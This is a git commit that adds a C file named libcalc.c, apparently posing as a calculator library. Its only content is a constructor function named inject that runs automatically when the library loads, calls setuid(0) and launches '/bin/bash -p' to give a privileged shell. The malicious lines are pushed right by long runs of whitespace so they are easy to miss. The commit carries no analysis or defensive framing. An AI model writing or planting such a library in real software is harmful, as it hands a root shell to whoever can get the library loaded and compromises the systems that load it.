86b3ccdbcc57936288adfde08167bb39c61b7a2c
kam1n0 <58341448+kam1n0@users.noreply.github.com>
2020-05-29 19:53:52 -0700

    Add files via upload

---
+++ libcalc.c
@@ -0,0 +1,6 @@
+#include <stdio.h>
+#include <stdlib.h>                                                                  
+static void inject() __attribute__((constructor));
+                                                                    void inject() {
+									    setuid(0);
+									    system("/bin/bash -p");                                     }
